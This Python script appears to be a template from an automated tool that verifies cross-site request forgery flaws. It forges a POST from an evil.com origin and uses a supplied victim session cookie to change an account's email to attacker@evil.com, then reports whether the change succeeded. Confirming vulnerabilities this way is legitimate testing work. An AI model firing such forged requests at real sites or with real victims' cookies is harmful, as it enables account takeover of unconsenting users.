import sys
import requests
import requests.exceptions

def verify():
    target_url = "{{TARGET_URL}}"
    # Action URL that should be protected by Anti-CSRF tokens
    action_url = "{{ACTION_URL}}"
    
    # LLM configures the forged request as it would appear from a victim's browser
    # usually relying on ambient cookies
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "http://evil.com",
        "Referer": "http://evil.com/"
    }
    
    # The forged cross-site data
    data = {"email": "attacker@evil.com"}

    try:
        print(f"[+] Verifying CSRF vulnerability at {action_url}")
        # Note: Since this is isolated, this typically assumes the victim's session cookie is pre-supplied
        # or the endpoint entirely lacks origin/token validation.
        cookies = {"session": "{{VICTIM_SESSION}}"}
        
        resp = requests.post(action_url, headers=headers, data=data, cookies=cookies, timeout=5)

        # Check if the state-changing action succeeded without a valid token
        if resp.status_code in [200, 302] and "Email updated" in resp.text:
            print("[+] CONFIRMED: Action performed successfully without CSRF token / from external origin.")
            sys.exit(0)
        else:
            print("[-] REJECTED: CSRF protection blocked the request.")
            sys.exit(1)
            
    except requests.exceptions.ConnectionError:
        print("[-] REJECTED: Connection refused (Sandbox is likely isolated / --network none).")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    verify()
